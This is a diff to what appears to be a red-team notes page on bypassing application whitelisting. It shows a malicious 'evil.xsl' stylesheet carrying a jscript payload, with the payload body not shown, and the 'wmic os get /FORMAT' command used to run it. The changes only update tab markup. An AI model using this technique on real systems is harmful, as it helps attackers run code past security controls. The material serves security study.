@@ -8,8 +8,8 @@ Another application whitelist bypassing technique discovered by Casey @subTee, s
 
 Define the XSL file containing the jscript payload:
 
-{% code-tabs %}
-{% code-tabs-item title="evil.xsl" %}
+{% tabs %}
+{% tab title="evil.xsl" %}
 ```csharp
 <?xml version='1.0'?>
 <stylesheet
@@ -23,18 +23,18 @@ version="1.0">
 	]]> </ms:script>
 </stylesheet>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Invoke any wmic command now and specify /format pointing to the evil.xsl:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 wmic os get /FORMAT:"evil.xsl"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-10-22-05-24.png)
 
